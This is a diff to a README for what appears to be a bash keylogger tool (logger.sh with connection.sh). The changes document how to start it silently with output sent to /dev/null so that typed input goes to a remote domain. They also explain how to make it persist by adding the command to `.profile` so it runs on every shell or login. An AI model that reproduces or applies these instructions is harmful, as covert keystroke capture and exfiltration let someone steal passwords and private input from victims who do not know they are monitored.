@@ -38,11 +38,11 @@ Positional Arguments:
 Options:
   -p path: give path to log file to listen to
 ```
-To start the keylogger, run the command `./logger.sh [domain] && exit`. This will silently start the keylogger, and any inputs typed will be sent. The `&& exit` at the end will cause the shell to close on `exit`. Without it, exiting will bring you back to the non-keylogged shell.
+To start the keylogger, run the command `./logger.sh [domain] &> /dev/null && exit`. This will silently start the keylogger, and any inputs typed will be sent. The `&& exit` at the end will cause the shell to close on `exit`. Without it, exiting will bring you back to the non-keylogged shell. Remove the `&> /dev/null` to display error messages.
 
-The `-p` option will specify the location of the temporary log file, where all the inputs are sent to. By default, this is `/tmp/`.
+The `-p` option will specify the location of the temporary log file where all the inputs are sent to. By default, this is `/tmp/`.
 
-`logger.sh` and `connection.sh` must be in the same directory for the keylogger to work. If you want persistance, you can add the command to the .bash_profile to start on a new interactive shell or on login.
+`logger.sh` and `connection.sh` must be in the same directory for the keylogger to work. If you want persistance, you can add the command to `.profile` to start on every new interactive shell or on login.
 ### `connection.sh`
 ```
 Usage: command [-options] domain
